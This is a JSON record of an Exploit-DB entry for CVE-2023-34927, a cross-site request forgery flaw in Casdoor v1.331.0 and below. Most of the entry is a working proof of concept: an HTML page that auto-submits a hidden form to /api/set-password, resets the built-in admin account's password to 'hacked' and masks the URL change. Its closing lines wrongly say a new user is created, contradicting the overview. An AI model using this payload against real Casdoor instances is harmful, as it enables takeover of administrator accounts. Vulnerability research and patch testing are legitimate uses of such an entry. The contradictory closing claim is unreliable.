{"source": "https://www.exploit-db.com/exploits/51961", "vulnName": "Casdoor < v1.331.0 - '/api/set-password' CSRF", "vulnEDBID": "51961", "vulnCVE": "2023-34927", "author": "VAN LAM NGUYEN", "exploitType": "WEBAPPS", "platform": "GO", "datePublished": "2024-04-02", "vulnContent": "# Exploit Title: Casdoor < v1.331.0 - '/api/set-password' CSRF\n# Application: Casdoor\n# Version: <= 1.331.0\n# Date: 03/07/2024\n# Exploit Author: Van Lam Nguyen \n# Vendor Homepage: https://casdoor.org/\n# Software Link: https://github.com/casdoor/casdoor\n# Tested on: Windows\n# CVE : CVE-2023-34927\n\nOverview\n==================================================\nCasdoor v1.331.0 and below was discovered to contain a Cross-Site Request Forgery (CSRF) in the endpoint /api/set-password. \nThis vulnerability allows attackers to arbitrarily change the victim user's password via supplying a crafted URL.\n\nProof of Concept\n==================================================\n\nMade an unauthorized request to /api/set-password that bypassed the old password entry authentication step\n\n<html>\n<form action=\"http://localhost:8000/api/set-password\" method=\"POST\">\n    <input name='userOwner' value='built&#45;in' type='hidden'>\n    <input name='userName' value='admin' type='hidden'>\n    <input name='newPassword' value='hacked' type='hidden'>\n    <input type=submit>\n</form>\n<script>\n    history.pushState('', '', '/');\n    document.forms[0].submit();\n</script>\n\n</html>\n\nIf a user is logged into the Casdoor Webapp at time of execution, a new user will be created in the app with the following credentials\n\nuserOwner: built&#45;in\nuserName: admin\nnewPassword: hacked\n            "}